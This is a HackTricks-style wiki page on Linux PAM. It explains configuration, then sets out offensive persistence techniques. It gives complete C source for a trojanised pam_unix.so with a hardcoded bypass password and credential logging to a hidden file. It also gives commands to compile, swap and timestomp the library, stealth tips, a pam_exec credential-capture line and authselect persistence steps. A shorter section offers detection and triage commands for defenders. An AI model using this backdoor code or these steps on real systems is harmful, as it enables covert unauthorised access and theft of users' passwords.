# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basic Information

**PAM (Pluggable Authentication Modules)** acts as a security mechanism that **verifies the identity of users attempting to access computer services**, controlling their access based on various criteria. It's akin to a digital gatekeeper, ensuring that only authorized users can engage with specific services while potentially limiting their usage to prevent system overloads.

#### Configuration Files

- **Solaris and UNIX-based systems** typically utilize a central configuration file located at `/etc/pam.conf`.
- **Linux systems** prefer a directory approach, storing service-specific configurations within `/etc/pam.d`. For instance, the configuration file for the login service is found at `/etc/pam.d/login`.

An example of a PAM configuration for the login service might look like this:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM Management Realms**

These realms, or management groups, include **auth**, **account**, **password**, and **session**, each responsible for different aspects of the authentication and session management process:

- **Auth**: Validates user identity, often by prompting for a password.
- **Account**: Handles account verification, checking for conditions like group membership or time-of-day restrictions.
- **Password**: Manages password updates, including complexity checks or dictionary attacks prevention.
- **Session**: Manages actions during the start or end of a service session, such as mounting directories or setting resource limits.

#### **PAM Module Controls**

Controls dictate the module's response to success or failure, influencing the overall authentication process. These include:

- **Required**: Failure of a required module results in eventual failure, but only after all subsequent modules are checked.
- **Requisite**: Immediate termination of the process upon failure.
- **Sufficient**: Success bypasses the rest of the same realm's checks unless a subsequent module fails.
- **Optional**: Only causes failure if it's the sole module in the stack.

#### Offensive Semantics That Matter

When backdooring PAM, the **location of the inserted rule** is often more important than the payload itself:

- `include` and `substack` pull rules from other files, so editing `sshd` might only affect SSH while editing `system-auth`, `common-auth`, or another shared stack affects several services at once.
- PAM also supports bracketed controls such as `[success=1 default=ignore]`. These can be abused to **skip one or more modules** after a successful custom check instead of visibly replacing `pam_unix.so`.
- The `module-path` can be **absolute** (`/usr/lib/security/pam_custom.so`) or **relative** to the default PAM module directory. On modern Linux systems the real directories are often `/lib/security`, `/lib64/security`, `/usr/lib/security`, or multiarch paths like `/usr/lib/x86_64-linux-gnu/security`.

Quick operator takeaway: always map the **full service graph** before patching. For example, `sshd -> password-auth -> system-auth` on some distros or `sshd -> system-remote-login -> system-login -> system-auth` on others means the same one-line implant may fan out much wider than intended.

#### Example Scenario

In a setup with multiple auth modules, the process follows a strict order. If the `pam_securetty` module finds the login terminal unauthorized, root logins are blocked, yet all modules are still processed due to its "required" status. The `pam_env` sets environment variables, potentially aiding in user experience. The `pam_ldap` and `pam_unix` modules work together to authenticate the user, with `pam_unix` attempting to use a previously supplied password, enhancing efficiency and flexibility in authentication methods.


## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**.  Because every SSH / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials or implement a *magic* password bypass.

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
    dprintf(fd, "%s:%s\n", user, pass);
    close(fd);

    /* Fall back to original function */
    if(!orig) {
        orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
    }
    return orig(pamh, flags, argc, argv);
}
```

</details>

Compile and stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec Tips
1. **Atomic overwrite** – write to a temp file and `mv` into place to avoid half-written libraries that would lock out SSH.
2. Log file placement such as `/usr/bin/.dbus.log` blends with legitimate desktop artefacts.
3. Keep symbol exports identical (`pam_sm_setcred`, etc.) to avoid PAM mis-behaviour.

### Detection
* Compare MD5/SHA256 of `pam_unix.so` against distro package.
* `rpm -V pam` or `debsums -s libpam-modules` to spot replaced libraries without manual hashing.
* Check for world-writable or unusual ownership under `/lib/security/`.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep PAM configs for unexpected modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abusing `pam_exec` for persistence
Instead of replacing `pam_unix.so`, a lighter touch is to append a `pam_exec` line in `/etc/pam.d/sshd` so every SSH login launches an implant while leaving the normal stack intact:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` receives PAM metadata in environment variables such as `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, and `PAM_TYPE`. With `expose_authtok`, the helper can also read the password from `stdin` during `auth` or `password` phases. If you want the helper to run with the effective UID instead of the real UID, add `seteuid`.

Practical notes:

- `session optional pam_exec.so ...` is better for **post-login actions** such as re-opening sockets or spawning a detached daemon.
- `auth optional pam_exec.so quiet expose_authtok ...` is the usual choice for **credential capture** because it runs before the session opens.
- `type=session` or `type=auth` can be used to constrain execution to a specific PAM phase and avoid noisy double execution.

### Surviving distro tooling: `authselect`

On RHEL, CentOS Stream, Fedora, and derivative systems, direct edits to generated files such as `/etc/pam.d/system-auth` or `/etc/pam.d/password-auth` may be **overwritten by `authselect`**. For persistence, operators often patch the active custom profile under `/etc/authselect/custom/<profile>/` and then re-select or apply it.

Typical workflow when you have root:

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```

This matters for both offense and triage: if `/etc/pam.d/system-auth` contains the banner `Generated by authselect` and `Do not modify this file manually`, then the real persistence point may live under `/etc/authselect/custom/` rather than in `/etc/pam.d/`.

### Recent tradecraft seen in the wild

Recent 2025 reporting on the **Plague** Linux backdoor showed the same core idea taken further: a malicious PAM component with a **static bypass password**, plus cleanup of SSH-related environment variables and shell history (`HISTFILE=/dev/null`) to reduce session traces after login. That is a useful hunting pattern because the backdoor logic may live in PAM while the stealth artifacts only appear **after** authentication succeeds.


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
